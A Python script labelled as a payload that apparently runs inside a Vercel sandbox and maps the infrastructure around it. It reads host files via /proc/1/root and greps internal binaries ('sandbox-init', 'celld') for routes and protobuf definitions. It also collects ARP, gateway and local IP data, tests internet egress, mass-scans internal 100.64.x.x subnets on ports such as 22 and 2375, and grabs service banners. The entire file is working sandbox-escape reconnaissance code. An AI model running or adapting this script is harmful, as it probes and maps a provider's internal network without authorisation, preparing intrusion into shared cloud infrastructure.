# -*- coding: utf-8 -*-
"""v173 payload: 快速提取 + select 异步网段扫描 + 网关/ARP/出网探测
输出 /vercel/sandbox/v173c.out"""
import socket, struct, time, json, os, signal, re, ctypes, subprocess, select as sel

OUT = '/vercel/sandbox/v173c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(275)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def bin_grep(path, kws, max_size=400 * 1024 * 1024, max_hits=40, ctx=90):
    try:
        size = os.path.getsize(path)
        log('BIN %s size=%d' % (path, size))
        if size > max_size:
            return
        data = open(path, 'rb').read()
        hits = 0
        for kw in kws:
            if hits >= max_hits:
                break
            for m in re.finditer(kw, data):
                s = max(0, m.start() - ctx)
                seg = data[s:m.end() + ctx]
                printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                if printable * 10 < len(seg) * 4:
                    continue
                log('BIN %s @0x%x: %r' % (kw, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('BIN done hits=%d' % hits)
    except Exception as e:
        log('BIN EXC %s' % e)


# ============ 1: sandbox-init 路由提取 ============
log('=== 1 sbi ===')
SBI = '/proc/1/root/volumes/run/vercel/share/sandbox-init'
bin_grep(SBI, [rb'init\.sock', rb'/[a-z_]+/[a-z_]+', rb'/v1/', rb'HandleFunc', rb'serveMux',
               rb'/health', rb'status', rb'start|stop'],
         max_hits=40, ctx=80)

# ============ 2: Process descriptor ============
log('=== 2 proc proto ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    i = data.find(b'\x13types/process.proto\x12\x14vercel.hive.types.v1')
    if i > 0:
        seg = data[i - 50:i + 2200]
        for j in range(0, len(seg), 420):
            log('PP %r' % seg[j:j + 420])
except Exception as e:
    log('PP EXC %s' % e)

# ============ 3: ARP + 网关 + 出网 ============
log('=== 3 arp/gw ===')
try:
    log('ARP: %s' % open('/proc/net/arp').read()[:1500])
except Exception as e:
    log('ARP EXC %s' % e)
# 网关
try:
    gw = None
    for ln in open('/proc/1/net/route').read().splitlines()[1:]:
        p = ln.split()
        if p[1] == '00000000':
            gw = socket.inet_ntoa(struct.pack('<I', int(p[2], 16)))
    log('GW=%s' % gw)
except Exception as e:
    log('GW EXC %s' % e)
# 本机 IP
try:
    myip = None
    fib = open('/proc/1/net/fib_trie').read()
    for mm in re.finditer(r'\|-- (100\.64\.\d+\.\d+)\n\s+/32 host LOCAL', fib):
        myip = mm.group(1)
        log('MYIP=%s' % myip)
        break
except Exception as e:
    log('MYIP EXC %s' % e)
# 网关探测
for gip in ['100.64.64.1', '100.64.64.2']:
    for p in [80, 443, 22, 8080]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex((gip, p)) == 0:
                log('GWHIT %s:%d OPEN' % (gip, p))
            s.close()
        except Exception:
            pass
# 出网测试
for url in ['https://example.com/', 'http://example.com/']:
    r = subprocess.run(['curl', '-sS', '-m', '5', '-o', '/dev/null', '-w', '%{http_code}', url],
                       capture_output=True, timeout=8)
    log('OUT %s -> %s' % (url, r.stdout.decode(errors='replace')[:50]))

# ============ 4: select 异步扫描 ============
log('=== 4 async scan ===')
targets = []
if myip:
    parts = myip.split('.')
    my24 = '%s.%s.%s.' % (parts[0], parts[1], parts[2])
else:
    my24 = '100.64.123.'
nets = [my24, '100.64.64.', '100.64.0.', '100.64.255.', '100.64.1.', '100.64.254.']
ports = [22, 80, 443, 8080, 3000, 5000, 2375]
for net in nets:
    for i in range(1, 255):
        ip = net + str(i)
        for p in ports:
            targets.append((ip, p))

def async_scan(targets, timeout=0.5, batch=600):
    hits = []
    for b in range(0, len(targets), batch):
        chunk = targets[b:b + batch]
        socks = []
        for ip, p in chunk:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((ip, p))
                socks.append((s, ip, p))
            except Exception:
                pass
        t0 = time.time()
        while socks and time.time() - t0 < timeout:
            try:
                r, w, x = sel.select([], [s for s, _, _ in socks], [], 0.05)
                for s in w:
                    idx = next(i for i, (ss, _, _) in enumerate(socks) if ss == s)
                    ss, ip, p = socks.pop(idx)
                    try:
                        ss.settimeout(0.1)
                        if ss.recv(1) or True:
                            hits.append((ip, p))
                            log('NET HIT %s:%d' % (ip, p))
                    except Exception:
                        pass
                    ss.close()
            except Exception:
                break
        for s, ip, p in socks:
            try:
                s.close()
            except Exception:
                pass
    return hits

t0 = time.time()
hits = async_scan(targets, timeout=0.6, batch=600)
log('scan done %d targets %d hits took=%.0fs' % (len(targets), len(hits), time.time() - t0))

# ============ 5: 命中端口 banner ============
log('=== 5 banners ===')
for ip, p in hits[:20]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, p))
        if p in (80, 8080, 3000, 5000):
            s.sendall(b'GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n')
        d = b''
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                d += c
                if len(d) > 1500:
                    break
        except Exception:
            pass
        s.close()
        log('BANNER %s:%d -> %r' % (ip, p, d[:600]))
    except Exception as e:
        log('BANNER %s:%d EXC %s' % (ip, p, e))

log('V173_DONE')
f.close()
